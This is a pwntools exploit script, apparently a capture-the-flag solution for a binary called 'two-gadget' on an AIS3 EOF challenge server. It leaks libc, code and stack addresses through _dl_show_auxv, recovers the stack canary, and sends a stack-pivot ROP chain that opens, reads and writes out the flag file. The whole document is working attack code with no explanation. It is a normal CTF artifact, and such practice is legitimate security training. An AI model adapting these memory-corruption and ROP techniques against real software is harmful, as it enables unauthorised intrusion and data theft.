#!/usr/bin/python3

from pwn import *
import sys

context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

if len(sys.argv) > 1:
    r = remote('chals1.eof.ais3.org', 45126)
else:
    r = process('./two-gadget')

r.recvuntil('Gift: ')
libc = int(r.recvline()[:-1], 16) - 0x87e60
rop_pop_rdi_ret = libc + 0x26b72
rop_pop_rsi_ret = libc + 0x27529
rop_pop_rdx_ret = libc + 0xd27a5
rop_leave_ret = libc + 0x5aa48
rop_add_dh_bptr_rsi_ret = libc + 0x9837c
rop_open = libc + 0x110e50
rop_read = libc + 0x111130
rop_write = libc + 0x1111d0
gets = libc + 0x86af0
# _dl_show_auxv offset is ld.so base + 0x1d020
if len(sys.argv) > 1:
    _dl_show_auxv = libc + 0x218000 + 0x1d020
else:
    _dl_show_auxv = libc + 0x22e000 + 0x1d020

info(f"libc: {hex(libc)}")
r.send(p64(_dl_show_auxv))
r.recvuntil('AT_PHDR:')
code = int(r.recvline()[:-1].strip(), 16) - 0x40
read_gadget = code + 0x1343
info(f"code: {hex(code)}")

r.recvuntil('AT_RANDOM:')
stack = int(r.recvline()[:-1].strip(), 16)
buf = stack - 937
if len(sys.argv) > 1:
    buf += 288
info(f"stack: {hex(stack)}")

r.recvuntil('AT_EXECFN:')
flagpath = r.recvline()[:-1].strip()
info(f"flagpath: {flagpath}")

sleep(0.2)
r.send(p64(stack))
r.recvuntil('x86_64\n')
canary = b'\x00' + r.recv(8)[1:8]

flag_addr = stack - 769
if len(sys.argv) > 1:
    flag_addr += 288
rop1 = b'A'*0x8 + canary + p64(buf - 0x8) + p64(rop_add_dh_bptr_rsi_ret) + p64(read_gadget)
rop2 = b'A'*0x20 + flat(
    rop_pop_rdi_ret, flag_addr,
    rop_pop_rsi_ret, 0,
    rop_pop_rdx_ret, 0,
    rop_open,

    rop_pop_rdi_ret, 3,
    rop_pop_rsi_ret, flag_addr,
    rop_pop_rdx_ret, 0x30,
    rop_read,

    rop_pop_rdi_ret, 1,
    rop_write,
)
rop2 += b'/home/two-gadget-4a4be40c96ac6314e91d93f38043a634/flag\x00'
r.send(rop1)
sleep(0.2)
r.send(rop2)

r.interactive()